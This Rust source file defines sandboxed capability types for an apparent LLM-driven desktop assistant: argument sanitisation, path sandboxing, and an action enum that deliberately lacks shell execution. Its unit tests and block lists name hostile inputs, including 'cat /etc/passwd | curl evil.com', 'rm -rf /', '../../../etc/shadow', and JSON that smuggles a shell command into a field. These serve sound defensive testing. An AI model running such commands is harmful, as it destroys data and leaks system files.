/// Typed capability tokens that represent every OS-level action K.R.I.A. can perform.
///
/// # Security invariants
/// - `ShellExec` does NOT exist as a variant. There is no public constructor that produces
///   an unconstrained shell command. The type system enforces this statically.
/// - `SafeArg` rejects shell metacharacters at construction time.
/// - `SandboxedPath` canonicalizes the path and verifies it sits under an allowed prefix.
/// - All variants derive `Clone + Send + Sync + Serialize + Deserialize` so they survive
///   `tokio::spawn` and can be written to the audit log without borrowing.
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use thiserror::Error;
use url::Url;

use super::resolution::{ContactId, MessagingApp};

// ─── SafeArg ─────────────────────────────────────────────────────────────────

/// A validated command-line argument that contains no shell metacharacters.
///
/// This newtype is the only way to construct arguments passed to `LaunchApp`.
/// Any string containing shell-injectable characters is rejected at construction.
#[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct SafeArg(String);

/// Characters that have special meaning in POSIX shells or Windows cmd.
/// A `SafeArg` must not contain any of these.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '&', '|', '$', '`', '<', '>', '!', '{', '}', '(', ')', '\'', '"', '\\', '\n', '\r',
    '\0',
];

/// Characters that could represent path traversal in an argument.
const PATH_TRAVERSAL_SEQUENCES: &[&str] = &["../", "..\\", "/.."];

#[derive(Debug, Error)]
pub enum SafeArgError {
    #[error("argument is empty")]
    Empty,
    #[error("argument contains shell metacharacter '{0}'")]
    ShellMetacharacter(char),
    #[error("argument contains path traversal sequence")]
    PathTraversal,
}

impl SafeArg {
    pub fn new(s: impl Into<String>) -> Result<Self, SafeArgError> {
        let s = s.into();
        if s.is_empty() {
            return Err(SafeArgError::Empty);
        }
        for ch in SHELL_METACHARACTERS {
            if s.contains(*ch) {
                return Err(SafeArgError::ShellMetacharacter(*ch));
            }
        }
        for seq in PATH_TRAVERSAL_SEQUENCES {
            if s.contains(seq) {
                return Err(SafeArgError::PathTraversal);
            }
        }
        Ok(Self(s))
    }

    /// Infallibly construct from a known-safe literal (e.g., `--app-id`).
    /// Only for use in internal code with string literals, not user/LLM input.
    pub fn from_literal(s: &'static str) -> Self {
        // Debug-mode assertion to catch incorrect internal use.
        debug_assert!(
            !SHELL_METACHARACTERS.iter().any(|&c| s.contains(c)),
            "from_literal called with metacharacter in '{s}'"
        );
        Self(s.to_owned())
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl AsRef<std::ffi::OsStr> for SafeArg {
    fn as_ref(&self) -> &std::ffi::OsStr {
        self.0.as_ref()
    }
}

impl std::fmt::Display for SafeArg {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

// ─── SandboxedPath ───────────────────────────────────────────────────────────

/// A path that has been canonicalized and verified to lie under an allowed root.
///
/// The constructor resolves symlinks, normalizes `..` components, and checks that the
/// resulting path is prefixed by one of the user-allowed roots. Any path that escapes
/// the sandbox (including via symlink chains) is rejected.
#[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct SandboxedPath(PathBuf);

/// Paths that are always blocked regardless of user configuration.
const BLOCKED_ROOTS: &[&str] = &[
    "/etc",
    "/boot",
    "/root",
    "/usr",
    "/var",
    "/proc",
    "/sys",
    "/sbin",
    "/bin",
    "/lib",
    "/lib64",
    "/run",
    "/dev",
];

/// Sensitive dot-directories that are always blocked.
const BLOCKED_DOT_DIRS: &[&str] = &[".ssh", ".gnupg", ".pki", ".credentials", ".aws", ".kube"];

#[derive(Debug, Error)]
pub enum SandboxedPathError {
    #[error("path is empty")]
    Empty,
    #[error("path canonicalization failed: {0}")]
    CanonicalizationFailed(#[from] std::io::Error),
    #[error("path '{0}' is under a permanently blocked system root")]
    BlockedRoot(PathBuf),
    #[error("path '{0}' is under a sensitive dot-directory")]
    BlockedDotDir(PathBuf),
    #[error("path '{0}' is not under any allowed root")]
    OutsideAllowedRoot(PathBuf),
}

impl SandboxedPath {
    /// Construct a `SandboxedPath`.
    ///
    /// `allowed_roots` is typically `["/home/<user>"]`. The function calls
    /// `std::fs::canonicalize` which resolves all symlinks; a symlink pointing to `/etc`
    /// will be caught after resolution.
    pub fn new(
        p: impl AsRef<Path>,
        allowed_roots: &[impl AsRef<Path>],
    ) -> Result<Self, SandboxedPathError> {
        let p = p.as_ref();
        if p.as_os_str().is_empty() {
            return Err(SandboxedPathError::Empty);
        }

        // Canonicalize resolves all `..` and symlinks — this is where symlink escapes die.
        let canonical = std::fs::canonicalize(p)?;

        // Check permanently blocked system roots.
        for blocked in BLOCKED_ROOTS {
            let blocked_path = Path::new(blocked);
            if canonical.starts_with(blocked_path) {
                return Err(SandboxedPathError::BlockedRoot(canonical));
            }
        }

        // Check blocked dot-directories anywhere in the path.
        for component in canonical.components() {
            let name = component.as_os_str().to_string_lossy();
            for dot_dir in BLOCKED_DOT_DIRS {
                if name == *dot_dir {
                    return Err(SandboxedPathError::BlockedDotDir(canonical));
                }
            }
        }

        // Verify it lies under at least one allowed root.
        let under_allowed = allowed_roots
            .iter()
            .any(|root| canonical.starts_with(root.as_ref()));
        if !under_allowed {
            return Err(SandboxedPathError::OutsideAllowedRoot(canonical));
        }

        Ok(Self(canonical))
    }

    pub fn as_path(&self) -> &Path {
        &self.0
    }
}

impl AsRef<Path> for SandboxedPath {
    fn as_ref(&self) -> &Path {
        &self.0
    }
}

// ─── CanonicalAppId ──────────────────────────────────────────────────────────

/// A canonical application identifier resolved from user-supplied names.
///
/// Created only by `InstalledAppRegistry::resolve_alias` — never constructed
/// directly from LLM output.
#[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct CanonicalAppId(String);

impl CanonicalAppId {
    /// Only `InstalledAppRegistry` should call this.
    pub(crate) fn from_registry(id: String) -> Self {
        Self(id)
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for CanonicalAppId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

// ─── MessageBody ─────────────────────────────────────────────────────────────

/// A validated message body with a maximum length.
///
/// WhatsApp's soft limit is 4096 characters; we enforce 4096 here and truncate
/// with a visible marker rather than silently cropping.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct MessageBody(String);

const MAX_MESSAGE_BODY: usize = 4096;

#[derive(Debug, Error)]
pub enum MessageBodyError {
    #[error("message body is empty")]
    Empty,
}

impl MessageBody {
    pub fn new(s: impl Into<String>) -> Result<Self, MessageBodyError> {
        let s = s.into();
        if s.trim().is_empty() {
            return Err(MessageBodyError::Empty);
        }
        if s.len() > MAX_MESSAGE_BODY {
            // Truncate with a visible marker so the user knows it was cut.
            let truncated = format!("{}… [truncated]", &s[..MAX_MESSAGE_BODY.saturating_sub(15)]);
            return Ok(Self(truncated));
        }
        Ok(Self(s))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

// ─── Capability ──────────────────────────────────────────────────────────────

/// Every OS-level action K.R.I.A. can dispatch.
///
/// # Security note
/// There is **no `ShellExec` variant**. Code that imports this module cannot
/// express "run an arbitrary shell command" through the capability system.
/// Adding such a variant requires a code review, not just LLM output.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(tag = "intent", rename_all = "snake_case", deny_unknown_fields)]
pub enum Capability {
    /// Open a URI in the system's default handler (browser, mail client, etc.).
    /// The `Url` type guarantees syntactic validity; `classify_url` is called
    /// by `IntentDispatcher` before this reaches the backend.
    OpenUrl {
        url: Url,
    },

    /// Launch an installed application by its canonical registry ID.
    /// Arguments are `SafeArg` tokens — no shell metacharacters are possible.
    LaunchApp {
        app_id: CanonicalAppId,
        args: Vec<SafeArg>,
    },

    /// Open a messaging application and pre-fill a message draft.
    /// Does NOT claim to auto-send; the user must confirm in the app.
    SendMessage {
        app: MessagingApp,
        contact: ContactId,
        body: MessageBody,
    },

    /// Write bytes to a path that has been sandboxed and approved.
    FileWrite {
        path: SandboxedPath,
        content: Vec<u8>,
    },

    /// Invoke an accessibility-API action on a running application.
    /// Requires RED tier (typed PIN) and per-app opt-in.
    AxInvoke {
        app_id: CanonicalAppId,
        action: AxAction,
    },
}

/// Discrete accessibility actions (no free-form script injection).
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "snake_case", deny_unknown_fields)]
pub enum AxAction {
    Click { element_id: String },
    TypeText { element_id: String, text: String },
    Focus { element_id: String },
    SelectItem { element_id: String, value: String },
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;

    // ── SafeArg ──────────────────────────────────────────────────────────────

    #[test]
    fn safe_arg_rejects_semicolon() {
        assert!(SafeArg::new("ls; rm -rf /").is_err());
    }

    #[test]
    fn safe_arg_rejects_ampersand() {
        assert!(SafeArg::new("foo&bar").is_err());
    }

    #[test]
    fn safe_arg_rejects_pipe() {
        assert!(SafeArg::new("cat /etc/passwd | curl evil.com").is_err());
    }

    #[test]
    fn safe_arg_rejects_dollar() {
        assert!(SafeArg::new("$HOME").is_err());
    }

    #[test]
    fn safe_arg_rejects_backtick() {
        assert!(SafeArg::new("`id`").is_err());
    }

    #[test]
    fn safe_arg_rejects_path_traversal() {
        assert!(SafeArg::new("../../../etc/shadow").is_err());
    }

    #[test]
    fn safe_arg_rejects_empty() {
        assert!(SafeArg::new("").is_err());
    }

    #[test]
    fn safe_arg_accepts_url_flag() {
        assert!(SafeArg::new("--new-tab").is_ok());
    }

    #[test]
    fn safe_arg_accepts_plain_word() {
        assert!(SafeArg::new("hello world search").is_ok());
    }

    // ── SandboxedPath ────────────────────────────────────────────────────────

    #[test]
    fn sandboxed_path_blocks_etc() {
        let home = env::var("HOME").unwrap_or("/home/user".to_string());
        let result = SandboxedPath::new("/etc/passwd", &[&home]);
        assert!(matches!(result, Err(SandboxedPathError::BlockedRoot(_))));
    }

    #[test]
    fn sandboxed_path_blocks_boot() {
        let home = env::var("HOME").unwrap_or("/home/user".to_string());
        let result = SandboxedPath::new("/boot/grub/grub.cfg", &[&home]);
        assert!(matches!(result, Err(SandboxedPathError::BlockedRoot(_))));
    }

    #[test]
    fn sandboxed_path_blocks_outside_allowed() {
        // /tmp is not in the blocked roots but also not in allowed list.
        let result = SandboxedPath::new("/tmp", &["/home/user"]);
        // Will fail: either CanonicalizationFailed (if /tmp doesn't exist) or OutsideAllowedRoot.
        assert!(result.is_err());
    }

    // ── MessageBody ──────────────────────────────────────────────────────────

    #[test]
    fn message_body_rejects_empty() {
        assert!(MessageBody::new("").is_err());
        assert!(MessageBody::new("   ").is_err());
    }

    #[test]
    fn message_body_truncates_long() {
        let long = "x".repeat(MAX_MESSAGE_BODY + 100);
        let body = MessageBody::new(long).unwrap();
        assert!(body.as_str().len() <= MAX_MESSAGE_BODY + 20); // some slack for the marker
        assert!(body.as_str().contains("[truncated]"));
    }

    #[test]
    fn message_body_accepts_normal() {
        let body = MessageBody::new("hye").unwrap();
        assert_eq!(body.as_str(), "hye");
    }

    // ── Capability serde ─────────────────────────────────────────────────────

    #[test]
    fn capability_denies_unknown_fields() {
        // Inject an unknown field into an OpenUrl payload.
        let json = r#"{"intent":"open_url","url":"https://example.com","exec":"rm -rf /"}"#;
        let result = serde_json::from_str::<Capability>(json);
        assert!(
            result.is_err(),
            "unknown field 'exec' should be rejected by deny_unknown_fields"
        );
    }

    #[test]
    fn capability_no_shell_exec_variant() {
        // Attempt to deserialize a non-existent shell_exec intent.
        let json = r#"{"intent":"shell_exec","cmd":"rm -rf /"}"#;
        let result = serde_json::from_str::<Capability>(json);
        assert!(result.is_err(), "shell_exec variant must not exist");
    }

    #[test]
    fn capability_open_url_roundtrips() {
        let url: Url = "https://google.com/search?q=kittens".parse().unwrap();
        let cap = Capability::OpenUrl { url: url.clone() };
        let json = serde_json::to_string(&cap).unwrap();
        let cap2: Capability = serde_json::from_str(&json).unwrap();
        if let Capability::OpenUrl { url: u2 } = cap2 {
            assert_eq!(url, u2);
        } else {
            panic!("wrong variant");
        }
    }
}
